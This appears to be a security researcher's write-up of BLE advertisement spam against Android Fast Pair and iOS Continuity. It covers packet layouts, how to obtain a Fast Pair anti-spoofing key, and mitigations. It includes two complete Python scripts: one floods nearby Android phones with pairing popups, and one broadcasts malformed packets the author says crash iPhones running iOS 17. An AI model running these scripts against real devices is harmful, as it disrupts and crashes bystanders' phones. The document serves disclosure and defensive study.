# ble-spam-analysis

## In-depth analysis of BLE Spam:

## Overview

### Background - History of BLE attacks, credits

Much ink has been spilled recently over Bluetooth Low Energy (BLE) popups as an attack vector. In this post I will try to break down the attacks, how they work, why they work, and what can be done about them.

For a recent history of bluetooth spam, see [WillyJL's blog](https://willyjl.dev/blog/the-controversy-behind-apple-ble-spam#2019-2021-research-on-apple-continuity-ble)

### "Proximity-based messages" (generic)

A number of protocols have been developed that leverage the BLE advertisement specification in order to provide user-friendly functions that trigger when a device is brought physically close to your phone/tablet.

- On iOS, this protocol is called Continuity, and encompasses a variety of different message types. Of particular interest are the "Nearby Action" and "Proximity Pairing" messages, as these can cause popups on iOS devices.

- On Android, the Google Fast Pair protocol is used to connect a variety of devices to the phone via a half-sheet popup dialog.

- Samsung's proprietary fast pairing technology, as well as Windows Swift Pair, _are not covered here_.

### BLE Advertisements

Bluetooth Low Energy defines a specification for sending broadcast or "Advertising" messages. These messages do not contain a destination address, and are received by all devices within range of the sending device.

The outer envelope of a BLE advertisement is divided into the following sections:
- Preamble (1 byte)
- Access Address (4 bytes)
- Packet Data Unit (PDU) aka payoad - (8-39 bytes)
- CRC (3 bytes)

The PDU is further divided into:
- Header (2 bytes)
	- The first 4 bits represent PDU Type. We're interested in the ADV_IND (0000) type.
	- The remaining twelve bits encode various flags, and the length of the payload.

- Payload (6-37 bytes) - The structure of the payload varies based on the PDU type. The structure below applies to the ADV_IND PDU Type .This payload contains:
  	- The bluetooth advertising address (ADV_ADDR) (6 bytes)
  	- `0..N` instances of the following triplet of values (up to 31 bytes total):
  		- AD Length (1 byte) - Length of type+data fields combined
  		- AD Type (N bytes)
  		- AD Data (AD_LENGTH - N bytes)

There are several AD Types. Most of them, like Flags (0x01) and TX Power (0x0a) are standard types that are used by both Google and Apple protocols.

Arguably the most interesting AD type is "Manufacturer Specific" (0xFF). This type requires a 16 bit company ID as the first two bytes of data. Apple uses this custom type to implement their Continuity protocol within the remaining bytes. 

Google's Fast Pair protocol takes a similar approach with type 0xFF, but funnily enough this custom data isn't required to trigger popups on Android.

See [FuriousMAC's research](https://github.com/furiousMAC/continuity) for more details on the structure of the continuity protocol.

## Android

#### Structure of bluetooth ADV_IND packet:
```
+------------+-------------------+----------------+--------------------------------+-------------+
|  Preamble  |  Access Address   |  PDU Header    |          PDU Payload           |     CRC     |  First 4 bits of header declares
|  (1 byte)  |  (4 bytes)        |  (2 bytes)     |  (Variable length, up to 37B)  |  (3 bytes)  |  PDU Type. 0000=ADV_IND
+------------+-------------------+----------------+--------------------------------+-------------+
                                                                 |
                                                                 |
                                           +------------------------------------------+  
                                           |       ADV_IND PDU Payload Structure      |  ADV_IND payload must contain a 6 byte
                                           +----------+-------------------------------+  Advertising Address, so effective
                                           |  AdvAddr |         AdvData               |  max payload length is 31B
                                           |  (6B)    | (Variable length, up to 31B)  |
                                           +----------+-------------------------------+
                                                                 |
                                                                 |
                      +-------------------------------------------------------------------------------------+
                      |                         AdvData Structure (Repeated 0..N times)                     |    
                      +---------+--------+--------------------+-----+---------+--------+--------------------+
                      | Length0 |  Type0 |       Value0       | ... | LengthN |  TypeN |      ValueN        |
                      | (1B)    |  (1B)  | (Length - 1 bytes) | ... | (1B)    |  (1B)  | (Length - 1 bytes) |
                      +---------+---------+-------------------+-----+---------+--------+-=======------------+
```


### Generating packets
You can generate BLE advertisement packets on just about any device with a bluetooth radio and an SDK. 

While the Flipper form-factor makes it an extremely convenient tool for playing back messages, when it comes to quickly iterating playing around with variations and iterating on different messages (not to mention boosting the signal with a bluetooth adapter) I'm a huge fan of Raspberry Pi and similar Linux SBCs.  The code below should run on any linux system with bluez, and was tested specifically on a Pi Zero 2 W running Raspbian.

In order to supply the raw packet data, we need to use methods not publicly exposed by PyBlueZ. The [py-bluetooth-utils](https://github.com/colin-guyon/py-bluetooth-utils/tree/master) package calls directly into bluez libraries and provides functions that makes this easy:

- `toggle_device(dev_id, isEnabled)`
- `start_le_advertising(socket, min_interval, max_interval, data)`
- `stop_le_advertising(socket)`

Where `socket` is a BluetoothSocket, `min_interval` and `max_interval` are in milliseconds, and data is a list of byte values. `dev_id` is the HCI ID of the bluetooth adapter - usually `0`.

Bluez and py-bluetooth-utils handle the outer piece of the BLE advertisement, setting all the necessary bytes for the preamble, access address, and PDU header (including PDU type).

The bytes that we submit to `start_le_advertising` will represent the payload of an ADV_IND PDU type. This payload supports multiple segments, with each segment declaring its own length. We'll pack all of the bytes together into a tuple, then supply it to `start_le_advertising` and watch the magic happen.

Example code is provided for each section. Assuming a debian-like system, run the following commands:
- `apt install bluetooth bluez`
- `pip install pybluez`
- `curl -O https://raw.githubusercontent.com/colin-guyon/py-bluetooth-utils/master/bluetooth_utils.py`

The bluetooth_utils.py file should be placed in the same folder as your python script.

### Breakdown of packet

To trigger a popup on Android, we can craft a packet containing:

```c
<PREAMBLE>
<ACCESS_ADDR>
<PDU_HEADER>
<ADV_ADDR>

0x03 // Size
0x03 // Type ServiceUUID
0x2c, 0xfe // 0xFEC2=google_llc_fastpair

0x06 // size
0x16 // Type: Service Data
0x2c, 0xfe // 0xFEC2=google_llc_fastpair
0x10, 0x62, 0x09 // Anti-spoofing key

0x02 // size
0x0a // Type: Power Level
0xFF // The power level value
<CRC>
```

The payload for this packet is straightforward. It consists of 3 sections:
- The declared size of the first section is 0x03 (3)
- The next 3 bytes declare that this will be a google fast pair packet

- The declared size of the second section is 0x06 (6)
- The next 3 bytes declare that this section contains data related to google fast pair
- The next 3 bytes are the **Anti-Spoofing Key** for the device.

- The declared size of the final section is 0x02 (2)
- The next 2 bytes advertise the Transmit Power Level of the message. This is arbitrary, *but required to trigger proximity-based events*.

This packet is eventually processed here:
[NearbyManager.java](https://cs.android.com/android/platform/superproject/main/+/main:packages/modules/Connectivity/nearby/framework/java/android/nearby/NearbyManager.java)

### Anti-Spoofing Keys

Anti-spoofing keys are a mechanism used by Google to require developers integrating with Fast Pair to submit their proposed integration through the Google developer portal.

#### Purpose of Anti-Spoofing Keys

Anti spoofing keys are a mechanism used by Google to ensure that they have the final say over any devices that wish to integrate with Fast Pair. When a new Fast Pair device is created in the Google Developer Portal, a 24-bit "Anti-Spoofing" key is assigned to the device. Customers are asked to upload details on the device, including all text and images, as well as documented test procedures, in order to receive approval. Once Google approves a device, the associated key is considered valid and will trigger the associated behavior on all Android devices that support Fast Pair.

In addition enumerating a wide variety of real devices (mostly headphones), @ecto-1a also found a number of "debug" devices that are active and can be triggered.

#### Getting your own

It is possible to get your own Anti-Spoofing key, and in the process register whatever image you choose. This key will not be approved by Google, so the associated popups only work on phones that have been put into Developer mode. Still, many otherwise security-conscious folks tend to turn on Developer mode for the sake of rooting and using ADB.  This makes them susceptible to showing arbitrary content (provided you add it in your developer portal ahead of time).

To get your own key:
1. Go to the [Google Developer Console](https://developers.google.com/nearby/devices)
2. Click "Add Series"
3. Enter the following information:
   1. Series Name: This just identifies it on the dashboard. It's meant to group multiple revisions of the same device.
   2. Company Name: Pick anything
   3. Public Date: Set this to any time on or before the current time. If you set it in the future, you'll only see a placeholder text and image until the date has passed.
   4. Device Information: (You only need one)
      1. Device Name: This is the text that will be shown on the popup
      2. SKU Name: Arbitrary, but required.
   5. Protocols - Fast Pair:
      1. Device Type: - Headphones, but feel free to experiment
      2. Notification Type - Fast Pair, but feel free to experiment
      3. Image: Upload any image! (512x512 png, max 1MB)
      4. (The rest of the fields can be left as defaults)

Once you have entered this information, click "Save Draft" instead of "Submit". This will take you to a page with details of your new device. On this page, find the "Model" (a 6 character hex string).

This is your Anti-Spoofing key. Including these bytes in a spoofed packet will trigger the text and image that you supplied, provided the phones is in dev mode.

#### Generate Fast Pair popup on Android:
```python
import signal
import random
import bluetooth._bluetooth as bluez
from time import sleep
from bluetooth_utils import (toggle_device, start_le_advertising,
                             stop_le_advertising)

dev_id = 0
toggle_device(dev_id, True)

try:
    sock = bluez.hci_open_dev(dev_id)
except:
    print("Cannot open bluetooth device %i" % dev_id)
    raise

adv_type = 0x03
interval = 50

# size, type, svc_uuid (2 bytes)
service_uuids = (0x03, 0x03, 0x2c, 0xfe)

# size, type, svc_uuid (2 bytes), anti_spoofing_key (3 bytes)
service_data = (0x06, 0x16, 0x2c, 0xfe,
                0xcd, 0x82, 0x56)

try:
    while True:
        randomtx = random.choice(list(range(0, 21)) + list(range(154, 255)))
        power_level = (0x02, 0x0a, randomtx,)
        data = (service_uuids + service_data + power_level)

        start_le_advertising(
            sock,
            min_interval=interval,
            max_interval=interval,
            data=data
        )
        stop_le_advertising(sock)
except:
    stop_le_advertising(sock)
    raise

def signal_handler(sig, frame):
    print('\nStopping BLE advertisements.\n')
    stop_le_advertising(sock)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
```

---

## iOS

### Crashing iOS - Breakdown of exploit process

This process was discovered by @ecto-1a during fuzzing / brute forcing of the continuity protocol. The exploit reflects this, playing back a random sequence of Nearby Actions, but including corrupt Nearby Info in the same packet. It's only been documented to trigger a system crash on newer iPhones running iOS 17. I've tested the behavior on an iPhone 13 Pro and Pro Max running iOS 17-17.1.1, and was not able to trigger a crash on an iPad mini or iPhone SE2 running iOS 17.1 (although it still causes innumerable popups).

Newer phones, after showing a few popups will eventually stop responding, usually on a black screen. This requires a hard reboot (Vol+, Vol-, Hold Power) to restore service. If anyone tests it on iPhone SE3, iPhone 12, 11, 10(s) I'd love to know the results (mastodon:@jb0x168@infosec.exchange)

To generate a packet for this process, we create a packet containing a Nearby Action message, two null bytes, followed by a Nearby Info message with a litle random data thrown in:
1. Declare a valid size for the full packet
2. Create valid "service data" envelope declaring that the data inside is Apple's custom protocol, and its size.
3. Create the Nearby Action message as normal (valid size and payload), selecting an action at random.
4. Between the two messages, include the bytes `00 00`
5. Create the Nearby Info message, but supply 3 random bytes as the payload.
 
A normal packet might look like this - it's not unusual to see Nearby Action and Nearby Info messages in the same packet:

```c
<PREAMBLE>
<ACCESS_ADDR>
<PDU_HEADER>
<ADV_ADDR>

0x02 // size
0x01 // Type: flags
0x1a // Flags (specifics not important)

0x02 // size
0x0a // Type: Power Level
0xFF // The power level value

0x0e // size
0xff //  manufacturer specific
0x4c, 0x00 // Company: Apple Inc (0x004C)

0x0f // Tag: Nearby Action
0x05 // length
0x90 // Action Flags
0x00 // Action Type?
0xe1, 0xef, 0xd2 //  Auth tag (3 bytes)

0x10 // Tag: Nearby Info
0x05 // length
0x01 // Status Flags / Action Code (upper/lower bits)
0x04 // Data Flags
0xe1, 0xef, 0xd2 //  Auth tag (3 bytes)

<CRC>
```

Our fudged packets look more like this:
```c
<PREAMBLE>
<ACCESS_ADDR>
<PDU_HEADER>
<ADV_ADDR>

0x10 // size
0xff //  manufacturer specific
0x4c, 0x00 // Company: Apple Inc (0x004C)

0x0f // Tag: Nearby Action
0x05 // length
0x90 // Action Flags
<random action> // Nearby Action Type
<random byte>, <random byte>, <random byte> //  Auth tag (3 bytes)

0x00,
0x00,
0x10,
<random byte>, <random byte>, <random byte>

<CRC>
```
###

The exact cause of the crash isn't known, but we can make a few educated guesses as to what might be happening.

Reading the packet-byte-byte, everything is hunky-dory up until the end of the Nearby Action message. Since we still have bytes left in the overall size (Total size=0x10, or 16) we read the next byte, expecting to find a Continuity Message Type, for example 0x10 for a Nearby Info message.

Instead, we get a message type of 0x00. This type has not been documented in any normal continuity messages. Assuming that it still gets parsed, the next byte would be the message size, but uh-oh! it's also 0x00.

A number of things could be happening next. The most logical thing would be for the system to throw away both these values, and try again with the next byte to find a triplet of (type,size,data) that is equal to or less than the remaining size (4 bytes). This time, we give it a valid message type (0x10, Nearby Info), but instead of declaring a valid size for the rest of the message, we're supplying a random byte from 0-255. Regardless of the declared size, we only provide two more bytes.

This alone could theoretically cause bluetoothd to read past the end of a buffer, but it doesn't explain the need for the two null bytes between messages. It's possible that there's some other behavior associated with parsing a type of 0x00 with a size of 0x00 that puts some other part of the system into a bad state. More testing is required to answer this definitively.

#### Error logs
When the device locks up, a flurry of messages are seen across various services. I've observed these beginning with messages about mismatched packet lengths in bluetoothd (as you would expect from the exploit) followed by invalid connection states, and culminating in a number of other processes that rely on services from bluetoothd failing in various ways. 

This research is still in progress and will be updated as more information is avialable.

- The following messages have been observed 

```log
error  bluetoothd   96  0x17a6  50366  15:26:23.806806-0800  Server.LE.Connection  bluetoothd  getNextLeConnectionRSSIThresholdState: B51FD534-4995-134C-06C4-D05AB29D5486 is in invalid state	com.apple.bluetooth
error  bluetoothd  425  0x229b  51473  15:26:25.878417-0800  WirelessProximity     WPDaemon    Advertising failed to start for client <private> type 18 with error: Trying to update advertiser but peripheral manager isn't powered on	com.apple.bluetooth
error  bluetoothd  425  0x229b  51473  15:26:25.878367-0800  WirelessProximity     WPDaemon    ObjectDiscovery Advertising failed to start with error: Error Domain=WPErrorDomain Code=26 "Trying to update advertiser but peripheral manager isn't powered on" UserInfo={NSLocalizedDescription=Trying to update advertiser but peripheral manager isn't powered on}	com.apple.bluetooth
error  bluetoothd  425  0x229b  51473  15:26:25.878345-0800  WirelessProximity     WPDaemon    Trying to update advertiser but peripheral manager isn't powered on	com.apple.bluetooth
error  bluetoothd  425  0x229b  51473  15:26:25.878319-0800  WirelessProximity     WPDaemon    ObjectDiscovery -[WPDObjectDiscoveryManager updateAdvertiser] updated with error: Trying to update advertiser but peripheral manager isn't powered on	com.apple.bluetooth
```

  - searchpartyd
  - nearbyd
  - firmwareUpdate
  - mediasetupd
	- 
	```log 
		error	mediasetupd	357	0x1c6a	27573	15:26:18.646193-0800	XPCEventRouter.Client	HomeKit	[1CAEDC10-E3E5-41A4-BB17-A9EEBA14A938] Could not create BTA successfully	com.apple.HomeKit
	```

# Generate ios crash
```python
import signal
import random
from random import choice, randint
import bluetooth._bluetooth as bluez
from time import sleep
from bluetooth_utils import (toggle_device, start_le_advertising,
                             stop_le_advertising)

def build_crash_packet():
    actions = ( 0x13, # AppleTV AutoFill
                0x27, # AppleTV Connecting...
                0x20, # Join This AppleTV?
                0x19, # AppleTV Audio Sync
                0x1E, # AppleTV Color Balance
                0x09, # Setup New iPhone
                0x02, # Transfer Phone Number
                0x0B, # HomePod Setup
                0x01, # Setup New AppleTV
                0x06, # Pair AppleTV
                0x0D, # HomeKit AppleTV Setup
                0x2B) # AppleID for AppleTV?

    action = random.choice(actions)

    flags = 0xC0
    if action == 0x20 and random.choice([True, False]):
        flags = 0xBF
    elif action == 0x09 and random.choice([True, False]):
        flags = 0x40

    total_size   = (0x10,)
    service_data = (0xff, 0x4c, 0x00)
    action_data  = (0x0f, 0x05, flags, action, randint(0,255), randint(0,255), randint(0,255))
    null_data    = (0x00, 0x00)
    garbage_data = (0x10, randint(0,255), randint(0,255), randint(0,255))

    return (total_size + service_data + action_data + null_data +  garbage_data)

dev_id = 0

try:
    toggle_device(dev_id, True)
    sock = bluez.hci_open_dev(dev_id)
except:
    print("Cannot open bluetooth device %i" % dev_id)
    raise

try:
    while True:
        start_le_advertising(
            sock,
            min_interval=50,
            max_interval=50,
            adv_type=0x03,
            data=build_crash_packet()
        )
        stop_le_advertising(sock)
except:
    stop_le_advertising(sock)
    raise

def signal_handler(sig, frame):
    print('\nStopping BLE advertisements.\n')
    stop_le_advertising(sock)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
```

## Mitigations

### "Really" disabling bluetooth on iOS and Android

An additional issue that exacerbates this problem is the fact that on both iOS and Android the most easily accessible bluetooth toggle, in the system-wide pulldown menu, does not actually disable bluetooth. While this toggle prevents pairing with new devices, it does not affect how the phone responds to bluetooth advertisements.

To fully disable bluetooth on iOS, it must be disabled from the Settings app. Toggling bluetooth, enabling airplane mode, and even enabling "Lockdown" mode (which disables a number of non-essential services in the name of security and privacy) do nothing to prevent these messages.

The behavior on android is even more puzzling. Toggling bluetooth from the control center does not prevent popups. Toggling airplane mode, from settings or from the control center, however *DOES* disable bluetooth and stop the popups. Toggling bluetooth back on, even while still in airplane mode, allows the popups to resume.

Android contains additional options for disabling bluetooth functionality, specificially the ability to disable notifications for "Nearby Share", although it is not obvious to a casual user that this is related to Fast Pair.

The "Lockdown" feature on Android is unrelated to bluetooth functionality.

### Cooldown differences between iOS and Android
While the popups are presented in a similar fashion on both device types, the behavior of the operating system toward repeat messages differs significantly. Both OSes attempt to mitigate repeat messages, with varying degrees of success.

iOS keeps track of what popups have been shown, and under normal circumstances will only show each popup once. However, this limitation is trivially defeated in multiple ways. Initial efforts to "spam" these messages simply cycle through the available messages.

Because locking and unlocking the phone is a reflexive response to this behavior, it has the effect of resetting the timer, and people continue to be deluged by the same messages.

On android, a popup must be dismissed twice before it triggers a cooldown. Per Google's documentation, this cooldown lasts 5 minutes, or until the device is rebooted, whichever is sooner. Locking and unlocking the phone will not affect this cooldown.

## Below the fold

### Links
- [Apple BLEEE](https://github.com/hexway/apple_bleee)
- [Xtreme firmware](https://github.com/Flipper-XFW/Xtreme-Firmware)
- [Proximity pairing messages](https://github.com/furiousMAC/continuity/blob/master/messages/proximity_pairing.md)
- [Register a fast pair device](https://developers.google.com/nearby/devices/)
- [Fast pair adoption process](https://developers.google.com/static/nearby/fast-pair/images/FP_Process_Overview.png)
- [Fast pair specification](https://developers.google.com/nearby/fast-pair/landing-page)
- [Fast pair adoption process](https://developers.google.com/static/nearby/fast-pair/images/FP_Process_Overview.png)
- [Fast pair provider specification](https://developers.google.com/nearby/fast-pair/specifications/service/provider)
- [Fast Pair FAQ](https://developers.google.com/nearby/fast-pair/fast-pair-faq)
- [Dismissing popups](https://developers.google.com/nearby/fast-pair/fast-pair-faq)
